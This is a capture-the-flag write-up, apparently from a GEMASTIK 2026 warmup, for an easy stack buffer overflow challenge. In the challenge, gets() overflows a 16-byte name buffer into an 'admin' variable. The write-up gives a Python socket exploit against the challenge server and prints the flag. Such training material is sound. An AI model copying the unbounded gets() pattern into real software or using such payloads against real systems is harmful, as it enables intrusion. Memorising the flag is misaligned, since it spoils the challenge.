---
title: "Are You Admin? — Buffer Overflow"
event: "GEMASTIK 2026 Warmup"
challenge: "Are You Admin?"
category: "pwn"
points: 500
difficulty: "easy"
flag: "GEMASTIK19{0v3rfl0w_ubah_var}"
---

# Are You Admin? (500 pts) — Pwn / Buffer Overflow

**Server:** `nc 15.232.89.109 9001`

**Source (`chall.c`):**

```c
volatile int admin = 0;
char name[16];
gets(name);                 // <-- overflow, no bounds check
if (admin != 0) { /* print flag */ }
```

## Eksploitasi

Stack layout: `name[16]` diikuti oleh `admin` (int). Overflow `name` dengan padding 20 byte
lalu 4 byte nonzero untuk mengubah `admin` menjadi != 0:

```python
import socket, time

s = socket.socket()
s.connect(("15.232.89.109", 9001))
time.sleep(0.5)

# 16 bytes buf + 4 bytes padding + 4 bytes admin override
payload = b"A" * 20 + b"\xff\xff\xff\xff"
s.sendall(payload + b"\n")
time.sleep(1.2)
print(s.recv(4096).decode())
# -> GEMASTIK19{0v3rfl0w_ubah_var}
```

## Flag

`GEMASTIK19{0v3rfl0w_ubah_var}`
